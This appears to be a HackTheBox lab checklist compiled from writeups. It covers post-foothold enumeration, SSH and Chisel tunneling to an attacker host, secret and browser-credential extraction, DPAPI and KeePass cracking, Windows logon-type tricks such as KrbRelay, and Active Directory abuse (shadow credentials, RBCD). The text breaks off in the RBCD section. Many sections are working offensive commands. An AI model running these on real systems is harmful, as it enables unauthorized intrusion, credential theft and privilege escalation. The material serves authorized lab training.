# HTB post-foothold and lateral-movement checklist

> Scope: authorized lab systems only. This sheet is synthesized from the 71 locally audited HTB writeups. Replace every uppercase placeholder; never paste a discovered secret into shell history when a prompt, file, or environment variable is safer.

> Citation note: machine-note and PDF links in this file are local-workspace links. The private GitHub mirror intentionally does not publish the official HTB PDFs, so PDF links resolve only in this workspace (or in another checkout where you have placed your own authorized copies).

Use this after the first command execution or shell. The objective is not “run every tool.” It is to identify the current security context, the services and files visible only from inside, the next identity that can cross a boundary, and the exact authentication context that identity requires.

## Working variables

```bash
export TARGET='10.10.10.10'
export ATTACKER='10.10.14.10'
export DOMAIN='example.htb'
export DC_FQDN='dc01.example.htb'
export DC_IP='10.10.10.10'
export AUTH_USER='user'
export AUTH_PASS='REPLACE_ME'
export NT_HASH='32_HEX_NT_HASH'
```

Keep a transition log:

```text
time | source identity/session | discovered secret or right | tested protocol | result | cleanup
```

For every new identity, repeat identity, group, privilege, listener, share, and domain-rights enumeration. A password that fails on SSH can still work on a web application; a certificate that authenticates to LDAP may not work with PKINIT; an Evil-WinRM session may not expose secrets available to an interactive desktop logon.

## 1. First ten minutes after landing

### Linux identity and host context

- [ ] Stabilize the shell and record the original process/TTY before changing anything.
- [ ] Identify real/effective IDs, supplementary groups, hostname, interfaces, routes, mounts, kernel, and container indicators.
- [ ] List local users with interactive shells and home directories.
- [ ] Run `sudo -l`; also check `doas`, SUID files, capabilities, cron, systemd timers, sockets, and container groups.
- [ ] Record listeners with their owning processes. External Nmap cannot see loopback-only services.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
id; groups; who; w
hostname -f; uname -a; cat /etc/os-release
ip -br a; ip route; cat /etc/resolv.conf; cat /etc/hosts
awk -F: '$7 !~ /(nologin|false)$/ {print $1,$6,$7}' /etc/passwd
findmnt; df -hT
test -f /.dockerenv && echo '[+] container marker: /.dockerenv'
cat /proc/1/cgroup 2>/dev/null
sudo -l 2>&1
command -v doas && cat /etc/doas.conf 2>/dev/null
find / -xdev -perm -4000 -type f -ls 2>/dev/null
getcap -r / 2>/dev/null
ss -lntup 2>/dev/null || netstat -lntup 2>/dev/null
ps auxwwf
systemctl list-timers --all 2>/dev/null
ls -la /etc/cron* /var/spool/cron 2>/dev/null
```

Interpretation:

- A web shell user plus a real user's readable application configuration usually suggests password reuse before a local exploit.
- Membership in `docker`, `lxd`, `netdata`, `scanner`, `proxy`, or a product-specific group is an attack-surface clue, not proof of exploitability.
- A custom SUID binary or sudo wrapper must be read/`strings`/traced. Do not reduce it to a generic GTFOBins lookup.
- `hidepid=2` can hide other users' processes; enumerate what the current service owns and what its configuration exposes. Usage's Monit credential is readable because Monit runs as the landed user.

Sources: [Busqueda](./htb-writeups/Busqueda.md), [Usage](./htb-writeups/Usage.md), [Editor](./htb-writeups/Editor.md), [Intentions](./htb-writeups/Intentions.md), [Mentor](./htb-writeups/Mentor.md).

### Windows identity and host context

- [ ] Record user, integrity, logon type, token groups, privileges, domain, hostname, interfaces, and routes.
- [ ] Enumerate local users/groups, sessions, processes with owners, services, scheduled tasks, installed software, Defender/AppLocker, and listeners.
- [ ] Check Credential Manager, PowerShell history, environment, profile directories, unusual top-level directories, recycle bin, and application configuration.
- [ ] Distinguish “privilege present” from “privilege enabled” and “group membership” from an effective right.

```powershell
whoami /all
whoami /groups
whoami /priv
hostname
ipconfig /all
route print
net user
net localgroup
query user
tasklist /v
Get-Process -IncludeUserName | Sort-Object UserName,ProcessName
Get-NetTCPConnection -State Listen | Sort-Object LocalPort
netstat -ano
Get-CimInstance Win32_Service | Select Name,StartName,State,PathName
schtasks /query /fo LIST /v
Get-CimInstance Win32_OperatingSystem | Select Caption,Version,BuildNumber,OSArchitecture
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*,HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* -ErrorAction SilentlyContinue | Select DisplayName,DisplayVersion
Get-ChildItem Env:
cmdkey /list
Get-PSReadLineOption 2>$null | Select HistorySavePath
Get-Content (Get-PSReadLineOption).HistorySavePath 2>$null
Get-ChildItem C:\ -Force
Get-ChildItem 'C:\$Recycle.Bin' -Force -Recurse -ErrorAction SilentlyContinue
```

Useful ACL and execution checks:

```cmd
icacls C:\PATH\TO\FILE
sc.exe qc SERVICE
sc.exe sdshow SERVICE
schtasks /query /tn TASK_NAME /fo LIST /v
```

Interpretation:

- `SeBackupPrivilege`/`SeRestorePrivilege` suggests backup semantics and protected-file access; it is not automatically DCSync.
- `Server Operators` can reconfigure services without being local Administrators.
- `SeServiceLogonRight` only helps if you create a true service-logon token; an `xp_cmdshell` or WinRM token can lack privileges assigned to the account.
- An internal service discovered with `netstat -ano` must be mapped back to its PID, process, account, and configuration.

Sources: [Markup](./htb-writeups/Markup.md), [Return](./htb-writeups/Return.md), [Cicada](./htb-writeups/Cicada.md), [DarkZero](./htb-writeups/DarkZero.md), [Signed](./htb-writeups/Signed.md).

## 2. Web-server configuration: hidden applications after foothold

This is mandatory after landing on a web host. The externally visible site is not necessarily the only site, root, binding, upstream, or execution identity.

### Nginx

```bash
nginx -T 2>&1 | tee /tmp/nginx.full.txt
grep -RniE 'server_name|listen|root |alias |proxy_pass|fastcgi_pass|auth_basic|include' \
  /etc/nginx/nginx.conf /etc/nginx/sites-enabled /etc/nginx/sites-available /etc/nginx/conf.d 2>/dev/null
find /var/www /srv/www /opt -maxdepth 4 -type f \
  \( -name '*.conf' -o -name '.env' -o -name 'config*' \) -ls 2>/dev/null
```

- [ ] Record every `server_name`, port, `root`, `alias`, upstream, socket, authentication file, and included configuration.
- [ ] Add internal names locally and browse with the correct Host header.
- [ ] Do not browse only `http://127.0.0.1:PORT`; applications often route by hostname.

Soccer's decisive transition is inspecting Nginx after the first shell and discovering `soc-player.soccer.htb`; Broker uses a root-run attacker-controlled Nginx configuration for a later boundary. Sources: [Soccer](./htb-writeups/Soccer.md) / [PDF](./htb-writeups/Soccer.pdf), [Broker](./htb-writeups/Broker.md).

### Apache/httpd

```bash
apachectl -S 2>&1 || httpd -S 2>&1
grep -RniE 'ServerName|ServerAlias|DocumentRoot|ProxyPass|Listen|AllowOverride|AuthUserFile' \
  /etc/apache2 /etc/httpd 2>/dev/null
find /var/www -maxdepth 5 -type f \( -name '.htaccess' -o -name '*.conf' -o -name '.env' \) -ls 2>/dev/null
```

- [ ] Inspect `sites-enabled`, `sites-available`, included fragments, `.htaccess`, document roots, PHP-FPM sockets, and service users.
- [ ] Compare configuration paths to writable directories and local-only bindings.

Pandora exposes a loopback-only application through Apache; Quick's `/etc/apache2/sites-enabled/000-default.conf` reveals `printerv2.quick.htb`, its document root, and stronger execution identity. Sources: [Pandora](./htb-writeups/Pandora.md), [Quick](./htb-writeups/Quick.md) / [PDF](./htb-writeups/Quick.pdf).

### IIS

```cmd
%windir%\system32\inetsrv\appcmd.exe list site
%windir%\system32\inetsrv\appcmd.exe list apppool
%windir%\system32\inetsrv\appcmd.exe list app /config
type %windir%\System32\inetsrv\config\applicationHost.config
```

```powershell
Import-Module WebAdministration -ErrorAction SilentlyContinue
Get-Website | Select Name,State,PhysicalPath,Bindings
Get-ChildItem IIS:\AppPools | Select Name,state,processModel
Get-ChildItem C:\inetpub -Force -Recurse -Depth 3 -ErrorAction SilentlyContinue
Get-ChildItem C:\inetpub -Filter web.config -Recurse -ErrorAction SilentlyContinue
```

- [ ] Record bindings, host headers, ports, physical paths, app-pool identities, virtual directories, connection strings, and credentials.
- [ ] A writable internal site's root can be a lateral transition even when the public root is read-only.

Flight uses a loopback IIS site on port 8000 and `WebDevs` write access to transition into the app-pool identity. Sources: [Flight](./htb-writeups/Flight.md) / [PDF](./htb-writeups/Flight.pdf), [Cereal](./htb-writeups/Cereal.md).

## 3. Local listeners, internal names, and tunneling

### Map service -> PID -> identity -> configuration

Linux:

```bash
ss -lntup
lsof -nP -iTCP -sTCP:LISTEN 2>/dev/null
readlink -f /proc/PID/exe
tr '\0' ' ' < /proc/PID/cmdline; echo
tr '\0' '\n' < /proc/PID/environ 2>/dev/null
```

Windows:

```powershell
Get-NetTCPConnection -State Listen | ForEach-Object {
  $p=Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
  [pscustomobject]@{Address=$_.LocalAddress;Port=$_.LocalPort;PID=$_.OwningProcess;Process=$p.ProcessName;Path=$p.Path}
}
Get-CimInstance Win32_Process | Select ProcessId,Name,ExecutablePath,CommandLine
```

Investigate loopback databases, administrative panels, browser-accessed services, debuggers, message queues, Redis, WinRMS, GraphQL, and alternate web roots. Examples include Monit `127.0.0.1:2812` (Usage), PostgreSQL in a container subnet (Mentor), Redis (Atom), VS Code/CEF debugging (Multimaster), WinRMS (Signed), ADSelfService Plus on 9251 (Cerberus), and GraphQL on 8080 (Cereal).

Two audited local-discovery transitions to keep verbatim in the checklist:

```bash
# Usage: /proc is hidepid=2, but Monit runs as dash, so dash can read its own control file.
ss -lntp | grep ':2812'
grep -nE 'set httpd|use address|allow ' ~/.monitrc
# Test the discovered allow admin:<password> value against the real local user (xander) over SSH.
ssh xander@TARGET

# Expressway: proxy group access exposes the hostname required by sudo's host-scoped rule.
id
grep -oE 'https?://[^ ]+' /var/log/squid/access.log.1 | sort -u
sudo -h offramp.expressway.htb -l
sudo -h offramp.expressway.htb bash
```

Do not substitute a guessed host for `offramp.expressway.htb`; that exact name is recovered from `access.log.1` and selects the matching sudo rule.

### SSH forwards

```bash
# Local port: browse remote loopback from the attacker.
ssh -N -L 8443:127.0.0.1:8443 USER@TARGET

# Dynamic SOCKS proxy. Configure proxychains/browser to use 127.0.0.1:1080.
ssh -N -D 1080 USER@TARGET

# Remote forward: expose a service reachable from the compromised host.
ssh -N -R 9000:127.0.0.1:9000 USER@ATTACKER
```

Preserve virtual-host routing:

```bash
echo '127.0.0.1 internal.example.htb' | sudo tee -a /etc/hosts
curl --resolve internal.example.htb:8443:127.0.0.1 https://internal.example.htb:8443/
```

### Chisel reverse SOCKS and port forwards

```bash
# Attacker
./chisel server --reverse --port 8000

# Compromised host: reverse SOCKS
./chisel client ATTACKER_IP:8000 R:socks

# Compromised host: make target loopback 3306 available on attacker 13306
./chisel client ATTACKER_IP:8000 R:13306:127.0.0.1:3306

# Attacker
proxychains4 nmap -sT -Pn -n INTERNAL_IP -p PORT
```

Validation:

```bash
ss -lntp | grep -E '1080|13306|8443'
curl -v --proxy socks5h://127.0.0.1:1080 http://INTERNAL_HOST/
```

If the TCP tunnel works but the application fails, check DNS/Host headers, SNI, TLS trust, proxy DNS (`socks5h`), and whether the service binds only to IPv6 loopback. Sources: [ServMon](./htb-writeups/ServMon.md), [Pandora](./htb-writeups/Pandora.md), [Eighteen](./htb-writeups/Eighteen.md), [Magic](./htb-writeups/Magic.md), [Cerberus](./htb-writeups/Cerberus.md).

## 4. Targeted secret discovery

### Application configuration and source

Search product paths first; broad recursive grep is noisy and can hang.

```bash
find /var/www /opt /srv /home -maxdepth 6 -type f \
  \( -name '.env' -o -name 'config.php' -o -name 'settings.php' -o -name 'db.php*' \
     -o -name 'application.properties' -o -name 'hibernate.cfg.xml' -o -name '*.yml' \
     -o -name '*.yaml' -o -name '*.ini' -o -name '*.conf' \) -ls 2>/dev/null
grep -RniE 'pass(word)?|secret|token|api[_-]?key|connection|string|jdbc|ldap|redis' \
  /var/www/APP /opt/APP 2>/dev/null
```

```powershell
Get-ChildItem C:\inetpub,C:\ProgramData,C:\Program` Files -Include web.config,*.config,*.xml,*.ini,*.yml,*.yaml -Recurse -ErrorAction SilentlyContinue
Get-ChildItem C:\PATH -File -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'password|secret|token|connectionString|ldap|redis' -ErrorAction SilentlyContinue
```

High-value audited examples:

- Dolibarr `conf.php` -> database password reused by a local user ([BoardLight](./htb-writeups/BoardLight.md)).
- XWiki `hibernate.cfg.xml` -> Oliver ([Editor](./htb-writeups/Editor.md)).
- Magic `db.php5` -> loopback MySQL -> Theseus ([Magic](./htb-writeups/Magic.md)).
- Gibbon/local MySQL and deleted WAPT archive configuration ([TheFrizz](./htb-writeups/TheFrizz.md)).
- Roundcube configuration/session encryption and email credential ([Outbound](./htb-writeups/Outbound.md)).
- Redis `requirepass` plus PortableKanban encrypted records ([Atom](./htb-writeups/Atom.md)).
- `nms-auth-config.xml.bak` in a website backup ([Puppy](./htb-writeups/Puppy.md)).

Test reuse deliberately against a real account list and the protocol that permits that account. Do not spray every service blindly.

### Git and deleted history

```bash
git -C /PATH status
git -C /PATH remote -v
git -C /PATH branch -a
git -C /PATH log --all --oneline --decorate --graph
git -C /PATH log --all -p -- .
git -C /PATH show COMMIT:path/to/file
git -C /PATH fsck --full --no-reflogs --unreachable
```

If Git rejects a root-owned repository as unsafe and the shell cannot write its normal config:

```bash
export HOME=/tmp/git-home
mkdir -p "$HOME"
git config --global --add safe.directory /PATH/TO/REPO
git -C /PATH/TO/REPO log --all -p
```

Sources: [Busqueda](./htb-writeups/Busqueda.md), [Editorial](./htb-writeups/Editorial.md), [Intentions](./htb-writeups/Intentions.md), [LinkVortex](./htb-writeups/LinkVortex.md).

### Shell and PowerShell history

```bash
find /home /root -maxdepth 3 -type f \( -name '.*history' -o -name '.mysql_history' -o -name '.psql_history' \) -ls 2>/dev/null
```

```powershell
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -Force -ErrorAction SilentlyContinue
Get-Content C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Timelapse's PSReadLine history provides the service identity needed to read LAPS. Source: [Timelapse](./htb-writeups/Timelapse.md).

### Local databases

```bash
mysql -h 127.0.0.1 -u DB_USER -p DB_NAME
psql 'host=127.0.0.1 user=DB_USER dbname=DB_NAME'
sqlite3 /PATH/APP.db '.tables'
sqlite3 /PATH/APP.db '.schema'
```

```cmd
sqlcmd -S localhost -E -Q "SELECT name FROM sys.databases"
sqlcmd -S localhost -U SQL_USER -P SQL_PASS -Q "SELECT name FROM sys.databases"
```

Confirm whether a database credential is application-only, SQL-local, Windows/domain, or reused by an OS account. Sources: [CozyHosting](./htb-writeups/CozyHosting.md), [StreamIO](./htb-writeups/StreamIO.md), [Mentor](./htb-writeups/Mentor.md), [Cereal](./htb-writeups/Cereal.md).

## 5. Credential stores and key material

### Firefox and live process memory

Copy Firefox profile files together; `key4.db` without `logins.json` is incomplete.

```powershell
Get-ChildItem C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles -Force -Recurse -ErrorAction SilentlyContinue
```

```bash
python3 firepwd.py -d /PATH/TO/COPIED_PROFILE
```

For a live privileged browser process in an authorized lab:

```cmd
procdump64.exe -accepteula -ma PID C:\Windows\Temp\browser.dmp
```

```bash
strings -el browser.dmp | less
strings -a browser.dmp | grep -iE 'user|pass|login|http'
```

Sources: [Heist](./htb-writeups/Heist.md), [StreamIO](./htb-writeups/StreamIO.md). Browsed uses malicious extension behavior, not saved-password decryption: [Browsed](./htb-writeups/Browsed.md).

### KeePass and PFX/PuTTY keys

```bash
keepass2john DATABASE.kdbx > keepass.hash
john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
pfx2john.py CERTIFICATE.pfx > pfx.hash
john --wordlist=/usr/share/wordlists/rockyou.txt pfx.hash
openssl pkcs12 -in CERTIFICATE.pfx -nocerts -nodes -out key.pem
openssl pkcs12 -in CERTIFICATE.pfx -clcerts -nokeys -out cert.pem
puttygen putty-key.ppk -O private-openssh -o id_rsa
chmod 600 id_rsa key.pem
```

Failure cues:

- Some Python 3 `pfx2john` versions print literal `b'...'` wrappers; remove the wrapper before cracking.
- Keeper's dump yields the incomplete phrase `dgrød med fløde`; searching that fragment reconstructs the exact Unicode master password phrase `rødgrød med fløde`. Preserve every Unicode character when opening `passcodes.kdbx`.
- A PuTTY private key must be converted before OpenSSH can use it.
- A KeePass entry may contain an NT hash rather than plaintext; choose pass-the-hash-capable protocols.

Sources: [Keeper](./htb-writeups/Keeper.md), [Timelapse](./htb-writeups/Timelapse.md), [Jeeves](./htb-writeups/Jeeves.md).

### Windows Credential Manager and DPAPI

```cmd
cmdkey /list
dir /a C:\Users\USER\AppData\Local\Microsoft\Credentials
dir /a C:\Users\USER\AppData\Roaming\Microsoft\Credentials
dir /a C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID
```

```powershell
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Credentials -Force
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Credentials -Force
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect -Force -Recurse
```

Important session rule:

- Evil-WinRM is a network logon. Saved Credential Manager/DPAPI secrets may not decrypt because the user's interactive profile and logon-derived keys are unavailable.
- Spawn an authorized interactive logon for the same user, load the profile, then enumerate/decrypt.

Representative PowerShell form (verify the loaded RunasCs function's help because parameter spelling differs by build):

```powershell
Import-Module .\RunasCs.ps1
Get-Help Invoke-RunasCs -Full
Invoke-RunasCs -Username 'DOMAIN\USER' -Password 'PASSWORD' -Command 'powershell.exe' -LogonType 2 -ForceProfile
```

Vintage's exact sequence starts from C.Neri's Evil-WinRM network logon, creates a Type 2/default interactive process with the full profile, and only then enumerates/decrypts Credential Manager:

```powershell
Import-Module .\RunasCs.ps1
Invoke-RunasCs -Username C.Neri -Password 'DISCOVERED_PASSWORD' -Domain vintage.htb \
  -Command powershell.exe -Remote ATTACKER_IP:LISTEN_PORT -ForceProfile

# Run these in the returned Type 2 session, not the original Evil-WinRM session.
cmdkey /list
Import-Module .\Invoke-WCMDump.ps1
Invoke-WCMDump
# SharpDPAPI is the alternative when available; inspect its help for the selected build.
.\SharpDPAPI.exe triage
```

Expected evidence is the saved `C.Neri_adm` identity. If `cmdkey /list` or DPAPI output is empty in Evil-WinRM, that is a session-context failure, not proof that no saved credential exists.

Sources: [Access](./htb-writeups/Access.md), [Voleur](./htb-writeups/Voleur.md), [Vintage](./htb-writeups/Vintage.md).

## 6. Validate a new identity across protocols

### Do not conflate authentication modes

```bash
# SMB plaintext and hash
nxc smb "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS" --shares
nxc smb "$TARGET" -u "$AUTH_USER" -H "$NT_HASH" --shares
smbclient -L "//$TARGET" -U "$DOMAIN/$AUTH_USER%$AUTH_PASS"

# WinRM plaintext and hash
evil-winrm -i "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS"
evil-winrm -i "$TARGET" -u "$AUTH_USER" -H "$NT_HASH"

# WMI/SMB execution after authorization and access validation
impacket-wmiexec "$DOMAIN/$AUTH_USER:$AUTH_PASS@$TARGET"
impacket-psexec "$DOMAIN/$AUTH_USER:$AUTH_PASS@$TARGET"

# SSH / key
ssh "$AUTH_USER@$TARGET"
ssh -i id_rsa "$AUTH_USER@$TARGET"
```

Before remote execution, validate reachability, credential type, domain/local context, and admin/logon rights. A valid password can still fail WinRM if the account lacks `Remote Management Users`; PsExec can change the execution identity to SYSTEM and break EFS access that the Administrator user had.

Blackfield uses WMIExec for the final Administrator context because PsExec's SYSTEM context cannot decrypt the Administrator's EFS-protected file. Source: [Blackfield](./htb-writeups/Blackfield.md).

### MSSQL movement and trust boundaries

```bash
# Windows/domain authentication
impacket-mssqlclient "$DOMAIN/$AUTH_USER:$AUTH_PASS@$TARGET" -windows-auth

# Impacket SQL authentication is the default: omit -windows-auth.
impacket-mssqlclient "$AUTH_USER:$AUTH_PASS@$TARGET"

# NetExec needs the explicit local-auth switch for the same SQL-local account.
nxc mssql "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS" --local-auth
```

Inside the client:

```sql
SELECT SYSTEM_USER, ORIGINAL_LOGIN(), SUSER_SNAME();
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT name,is_linked FROM sys.servers;
EXECUTE AS LOGIN = 'LOGIN_NAME';
REVERT;
```

Impacket has no `-local-auth` option here: its default is SQL authentication, while `-windows-auth` explicitly selects Windows authentication. NetExec uses `--local-auth`. Inspect the interactive client's `help` for `enum_impersonate`, `enum_links`, `use_link`, and `enable_xp_cmdshell`, because helper availability varies by release. Re-check identity and role after every impersonation/link hop. Sources: [Eighteen](./htb-writeups/Eighteen.md), [Escape](./htb-writeups/Escape.md), [DarkZero](./htb-writeups/DarkZero.md), [Multimaster](./htb-writeups/Multimaster.md).

### Kerberos session hygiene

```bash
sudo ntpdate "$DC_IP"                 # or use another authorized time-sync method
export KRB5CCNAME=/absolute/path/user.ccache
klist
impacket-getTGT "$DOMAIN/$AUTH_USER:$AUTH_PASS" -dc-ip "$DC_IP"
impacket-ticketConverter ticket.kirbi ticket.ccache
```

- Use separate ccache filenames and explicit `KRB5CCNAME` values for every identity.
- Map the DC FQDN correctly; Kerberos is sensitive to names, DNS, SPNs, and clock skew.
- `KRB_AP_ERR_SKEW` means fix time before changing the attack hypothesis.
- A ticket may need to be forwardable (`kinit -f`) for delegation.
- A valid ticket in one logon session is not automatically visible in another.

Sources: [Certified](./htb-writeups/Certified.md), [Administrator](./htb-writeups/Administrator.md), [Vintage](./htb-writeups/Vintage.md), [Eighteen](./htb-writeups/Eighteen.md).

## 7. Windows logon types: choose the correct token

| Need | Logon context | Why |
|---|---|---|
| Normal remote shell | WinRM/network logon | Good for commands; can lack DPAPI/CredMan material and interactive-token behavior. |
| User profile + DPAPI/CredMan | Type 2 interactive + force profile | Loads the user's profile and interactive logon secrets. |
| Network identity without local password validation | Type 9 / `runas /netonly` | Useful for Kerberos/relay tooling; supplied local password can be arbitrary. |
| Rights granted through `SeServiceLogonRight` | Type 5 service | Required when the network/SQL token lacks service-token privileges. |

RunasCs command-line form used by the Absolute writeup:

```cmd
RunasCs.exe USER -d DOMAIN ANY_LOCAL_PASSWORD -l 9 "COMMAND"
```

Always run the tool's `--help`; PowerShell and compiled versions use different option names. After changing group membership, log out/reconnect so the new SID enters the token.

Examples:

- Vintage: Type 2 + profile for saved Credential Manager data.
- Absolute/Eighteen: Type 9 for Kerberos/relay behavior.
- DarkZero: Type 5 plus `BypassUAC` to restore the service account's token privileges.
- RustyKey: network logon is denied by GPO; obtain an allowed interactive/service-session context.

### DarkZero: recover a password-equivalent, then create a true Type 5 token

The `xp_cmdshell` session runs as `svc_sql` but its network/SQL token lacks the service account's expected impersonation privileges. Confirm `SeServiceLogonRight` in `C:\Policy_Backup.inf`, then perform the complete transition:

```powershell
# Run inside the existing svc_sql context; copy the /nowrap Base64 ticket out intact.
C:\Windows\Tasks\Rubeus.exe tgtdeleg /nowrap
```

```bash
# Attacker: convert the copied ticket and reach the internal DC through the existing SOCKS tunnel.
base64 -d svc_sql.kirbi.b64 > svc_sql.kirbi
impacket-ticketConverter svc_sql.kirbi svc_sql.ccache
export KRB5CCNAME="$(realpath svc_sql.ccache)"
klist

# Use the delegated ticket to request the User-template certificate, then recover svc_sql's NT hash.
proxychains4 certipy req -u svc_sql -k -no-pass -target "$DZ_DC_FQDN" \
  -ca "$DZ_CA_NAME" -template User
proxychains4 certipy auth -pfx svc_sql.pfx -domain "$DZ_DOMAIN" -dc-ip "$DZ_DC_IP"

# Change svc_sql to a known password-equivalent hash; NEW_NT_HASH must represent NEW_PASS.
proxychains4 impacket-changepasswd -hashes ":$SVC_SQL_NT" -newhash ":$NEW_NT_HASH" \
  "$DZ_DOMAIN/svc_sql@$DZ_DC_FQDN"
proxychains4 nxc smb "$DZ_DC_IP" -u svc_sql -p "$NEW_PASS"
```

Back in the high-integrity Windows session, create the actual service-logon token and verify it before selecting an impersonation primitive:

```powershell
Import-Module .\RunasCs.ps1
Invoke-RunasCs -Username svc_sql -Password $env:NEW_PASS -LogonType 5 -BypassUAC -Command 'whoami /priv'
```

Success is not merely a new shell: `whoami /priv` must show the service-token privileges, including `SeImpersonatePrivilege`, that were absent from the original `xp_cmdshell` token.

### Absolute: Type 9 KrbRelay, free OXID port, valid CLSID, reconnect

Direct KrbRelay execution from Evil-WinRM returns `Access Denied` because PowerShell remoting is a noninteractive network logon. Compile/transfer both KrbRelay and CheckPort, then:

```cmd
CheckPort.exe
```

Choose a reported free OXID resolver port and a CLSID valid for the target Windows build (enumerate with OleView.NET or use a build-verified KrbRelay CLSID). Test Type 9 first:

```cmd
RunasCs.exe winrm_user -d DOMAIN ANY_LOCAL_PASSWORD -l 9 "qwinsta"
RunasCs.exe winrm_user -d DOMAIN ANY_LOCAL_PASSWORD -l 9 "C:\PATH\KrbRelay.exe -spn ldap/DC_FQDN -clsid VALID_CLSID -port FREE_OXID_PORT -add-groupmember Administrators winrm_user"
```

Type 9 is `runas /netonly`; the placeholder password is intentionally not validated locally. After LDAP modification succeeds, **exit the old WinRM session and reconnect** so the Administrators SID is added to the new token:

```cmd
net user winrm_user
whoami /groups
```

Sources: [Vintage](./htb-writeups/Vintage.md), [Absolute](./htb-writeups/Absolute.md), [DarkZero](./htb-writeups/DarkZero.md), [RustyKey](./htb-writeups/RustyKey.md).

## 8. Active Directory lateral-movement loop

### Re-collect after every identity or directory change

```bash
bloodhound-python -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" -ns "$DC_IP" -c All --zip
```

Windows collector:

```powershell
.\SharpHound.exe -c All --zipfilename bloodhound.zip
```

Checklist:

- [ ] Mark the current identity owned and find outbound object-control edges.
- [ ] Inspect nested groups, not only direct groups.
- [ ] Inspect sessions, PSRemote rights, local-admin rights, delegated rights, certificate rights, GPO/OU inheritance, and deleted/restorable objects.
- [ ] Verify the decisive ACL directly before modifying anything.
- [ ] Record original owner, DACL, group membership, UPN, SPN, key credentials, delegation attributes, and enabled state for cleanup.
- [ ] Re-collect after every ownership, group, password, UPN, SPN, shadow-credential, RBCD, or restore operation.

PowerView inspection examples:

```powershell
Get-DomainUser -Identity USER -Properties memberof,useraccountcontrol,serviceprincipalname
Get-DomainGroup -Identity GROUP -Properties member
Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs
Get-DomainComputer -Identity COMPUTER -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

Sources: [Forest](./htb-writeups/Forest.md), [Fluffy](./htb-writeups/Fluffy.md), [Administrator](./htb-writeups/Administrator.md), [Rebound](./htb-writeups/Rebound.md).

### ACL action map

| Edge/right | Typical authorized action | Validate first | Restore |
|---|---|---|---|
| `GenericAll` on user | Reset password, set SPN, shadow credential | Protected-object status; current attributes | Original password cannot be restored; remove temporary SPN/key credential |
| `GenericWrite` on user | Shadow credential or controlled SPN | Exact writable attributes | Remove injected value |
| `WriteOwner` | Set owner, then grant required DACL | Current owner/DACL | Restore owner and DACL |
| `WriteDACL` | Grant only required right | Current security descriptor | Restore saved DACL |
| Group add/self | Add controlled principal | Nested effects, token refresh | Remove member |
| `CreateChild`/OU control | Create object or inherited ACE | OU inheritance and object type | Delete object/remove ACE |
| Reanimate tombstones | Restore deleted account/object | Deleted-object metadata | Document restored state |

Examples include Forest's Account Operators/Exchange Windows Permissions chain, Eighteen's CreateChild on an OU, Administrator's user-to-user ACL chain, TombWatcher's deleted `cert_admin`, and Voleur's restored user. Sources: [Forest](./htb-writeups/Forest.md), [Eighteen](./htb-writeups/Eighteen.md), [TombWatcher](./htb-writeups/TombWatcher.md), [Voleur](./htb-writeups/Voleur.md).

### Shadow Credentials

Prerequisite: write access to `msDS-KeyCredentialLink` on the target user/computer.

```bash
certipy shadow auto -u "$AUTH_USER@$DOMAIN" -p "$AUTH_PASS" -account TARGET_ACCOUNT -dc-ip "$DC_IP"
```

Alternative tooling:

```bash
python3 pywhisker.py -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" --target TARGET_ACCOUNT --action add
```

- Save original key credentials.
- Obtain the PFX/TGT/hash in the exact authentication context required.
- Remove only the injected key credential when finished.
- If PKINIT returns unsupported pre-authentication, do not loop forever; certificate-over-LDAP/Schannel can be the intended path.

Sources: [Fluffy](./htb-writeups/Fluffy.md), [Certified](./htb-writeups/Certified.md), [Outdated](./htb-writeups/Outdated.md), [Absolute](./htb-writeups/Absolute.md), [Rebound](./htb-writeups/Rebound.md).

### gMSA and LAPS

```bash
# Discover/read gMSA where the current principal is authorized (module availability varies).
nxc ldap "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" --gmsa

# Query LAPS where authorized.
nxc ldap "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -M laps
```

LDAP attribute targets:

```bash
ldapsearch -x -H "ldap://$DC_IP" -D "$AUTH_USER@$DOMAIN" -W -b "DC=EXAMPLE,DC=HTB" \
  '(sAMAccountName=COMPUTER$)' ms-Mcs-AdmPwd msLAPS-Password
```

- A gMSA managed password must be parsed/derived into the correct key/hash before authentication.
- LAPS passwords are host-specific; use the local Administrator context for the correct computer.
- Reading a secret is a new identity transition: re-run shares, WinRM, LDAP, BloodHound, and delegation checks.

Sources: [Intelligence](./htb-writeups/Intelligence.md), [StreamIO](./htb-writeups/StreamIO.md), [Timelapse](./htb-writeups/Timelapse.md), [Vintage](./htb-writeups/Vintage.md), [Rebound](./htb-writeups/Rebound.md).

### RBCD and delegation

Prerequisites: control of a principal with an SPN (often a machine/gMSA) plus the right to write the target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity`.

```bash
impacket-addcomputer "$DOMAIN/$AUTH_USER:$AUTH_PASS" -computer-name 'EVIL01$' -computer-pass 'STRONG_TEMP_PASSWORD' -dc-ip "$DC_IP"
impacket-rbcd "$DOMAIN/$AUTH_USER:$AUTH_PASS" -delegate-from 'EVIL01$' -delegate-to 'TARGET01$' -action write -dc-ip "$DC_IP"
